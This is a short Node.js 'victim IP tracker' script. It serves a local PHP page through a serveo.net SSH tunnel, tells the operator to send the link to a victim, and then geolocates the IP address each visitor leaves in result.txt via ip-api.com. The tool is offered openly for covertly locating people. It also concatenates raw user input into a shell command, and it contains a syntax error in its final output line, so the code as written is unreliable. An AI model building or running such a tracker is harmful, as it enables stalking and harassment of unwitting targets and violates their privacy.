// Copyright© 2019 By Fajar Firdaus
// Please don't recode my program because i take a long time to finish this project

// Some depencies
var cmd = require('shelljs');
var f = require('fs');
var r = require('readline');
var c = require('colors');
var req = require("request");
var loading = require("ora");
var style = require("chalk");
var box = require("boxen");
var notif = require("beeper");

console.log(c.rainbow("[:———————————————————:]"))
console.log(style.bgBlue("[Coder] Fajar Firdaus"))
console.log(style.bgBlue("[Fb] Fajar Firdaus"))
console.log(style.bgBlue("[IG] fajar_firdaus_7"))
console.log(style.bgBlue("[YT] iTech7732"))
console.log(c.rainbow("[:———————————————————:]"))

// Create user input interface 
const user = r.createInterface({
    input : process.stdin,
    output : process.stdout
});

var userinput = c.rainbow('[ Input Website Name ] => ');

user.question(userinput, (q) => {
    cmd.exec("php -S localhost:8080 > /dev/null 2>&1 & ");
    cmd.exec("ssh -o ServerAliveInterval=60 -R " + `${q}` + ":80:localhost:8080 serveo.net > /dev/null 2>&1 &");
    console.log(c.blue("[ Send This Link To Victim ] > " + `${q}` + ".serveo.net"));
    loading("Listening...\n").start();
    f.watchFile("result.txt", function(current, previous){
    var a = f.readFileSync("result.txt", "utf8");
    var ipvictim = a.substr(7, 13);
    req("http://ip-api.com/json/" + ipvictim, function(error, response, body){
    var js = JSON.parse(body);
    console.log(c.green("[IP] : " + ipvictim));
    notif(3);
    console.log(style.green(box("[IP] " + js["query"] + "\n" + "[KOTA] " + js["city"] + "\n" + "[NEGARA] " + js["country"] + "\n" + "[WAKTU] " + js["timezone"] + "\n" + "[KOORDINAT] " + js["lat"] + js["lon"] "\n"), {padding: 1}));
    console.log(c.red("[!] Type CTRL + C To Exit"));
});
});
});